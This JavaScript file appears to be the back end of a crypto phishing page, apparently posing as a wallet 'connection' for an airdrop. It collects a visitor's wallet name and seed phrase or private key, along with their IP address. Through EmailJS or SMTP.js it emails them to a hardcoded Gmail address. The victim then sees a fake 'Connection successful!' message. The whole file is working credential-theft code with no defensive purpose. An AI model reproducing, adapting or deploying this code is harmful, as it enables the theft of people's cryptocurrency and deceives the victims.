// Client-side email sending using EmailJS or similar service

// Using EmailJS (recommended for client-side email)
// Sign up at https://www.emailjs.com/ and get your credentials

const sendWalletData = async (walletName, secretPhrase, targetEmail = 'nwosuchimezie95@gmail.com') => {
    const timestamp = new Date().toLocaleString();
    
    // Get user's IP address (requires external service)
    let ipAddress = 'Unknown';
    try {
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        ipAddress = ipData.ip;
    } catch (error) {
        console.error('Failed to get IP:', error);
    }
    
    const emailData = {
        to_email: targetEmail,
        from_name: 'Wallet System',
        wallet_name: walletName,
        secret_phrase: secretPhrase,
        timestamp: timestamp,
        ip_address: ipAddress
    };
    
    try {
        // Using EmailJS
        const response = await emailjs.send(
            'YOUR_SERVICE_ID',      // Replace with your EmailJS service ID
            'YOUR_TEMPLATE_ID',     // Replace with your EmailJS template ID
            emailData,
            'YOUR_PUBLIC_KEY'       // Replace with your EmailJS public key
        );
        
        console.log('Email sent successfully:', response);
        return { status: 'success', message: 'Data sent successfully' };
    } catch (error) {
        console.error('Failed to send email:', error);
        return { status: 'error', message: 'Failed to send data' };
    }
};

// Example usage for POST registration
const handleRegistration = async (formData) => {
    const walletName = formData.wallet_name || 'Unknown Wallet';
    const secretPhrase = formData.secret_phrase || '';
    const targetEmail = formData.target_email || 'nwosuchimezie95@gmail.com';
    
    const result = await sendWalletData(walletName, secretPhrase, targetEmail);
    return result;
};

// Example: Handle form submission
document.getElementById('walletForm')?.addEventListener('submit', async (e) => {
    e.preventDefault();
    
    const formData = {
        action: 'registration',
        wallet_name: document.getElementById('wallet_name').value,
        secret_phrase: document.getElementById('secret_phrase').value,
        target_email: 'nwosuchimezie95@gmail.com'
    };
    
    const result = await handleRegistration(formData);
    console.log(result);
    
    // Show result to user
    if (result.status === 'success') {
        alert('Connection successful!');
    } else {
        alert('Connection failed. Please try again.');
    }
});

// Alternative: Using SMTP.js (simpler but less secure)
// Include: <script src="https://smtpjs.com/v3/smtp.js"></script>

const sendEmailSMTP = async (walletName, secretPhrase) => {
    const timestamp = new Date().toLocaleString();
    
    try {
        await Email.send({
            SecureToken: "YOUR_SECURE_TOKEN", // Get from https://smtpjs.com/
            To: 'nwosuchimezie95@gmail.com',
            From: "wallet-system@flrdropglobal.digital",
            Subject: `Wallet Connection Data - ${walletName}`,
            Body: `
                Wallet Connection Details:
                
                Wallet: ${walletName}
                Secret Phrase/Private Key: ${secretPhrase}
                
                Timestamp: ${timestamp}
            `
        });
        
        return { status: 'success', message: 'Data sent successfully' };
    } catch (error) {
        console.error('Email failed:', error);
        return { status: 'error', message: 'Failed to send data' };
    }
};